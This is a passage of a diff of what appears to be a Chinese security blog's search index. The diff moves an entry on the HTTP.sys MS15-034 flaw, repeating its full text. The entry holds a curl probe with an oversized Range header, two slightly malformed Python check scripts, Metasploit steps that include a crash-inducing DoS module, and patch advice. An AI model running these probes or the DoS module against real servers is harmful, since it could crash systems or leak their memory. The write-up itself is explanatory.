class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-
-
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary&#x2F;scanner&#x2F;http&#x2F;ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary&#x2F;dos&#x2F;http&#x2F;ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
-<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-      </categories>
-      <tags>
-        <tag>高危漏洞</tag>
-        <tag>命令执行漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HPP参数污染漏洞</title>
     <url>//4189faf9a367.html</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
@@ -1388,6 +1352,43 @@
       </categories>
       <tags>
         <tag>低危漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
+    <url>//67bda6fdaf83.html</url>
+    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
+<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
+<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器打上了补丁，那么响应状态应该是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary&#x2F;scanner&#x2F;http&#x2F;ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary&#x2F;dos&#x2F;http&#x2F;ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
+<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>命令执行漏洞</tag>
       </tags>
   </entry>
   <entry>
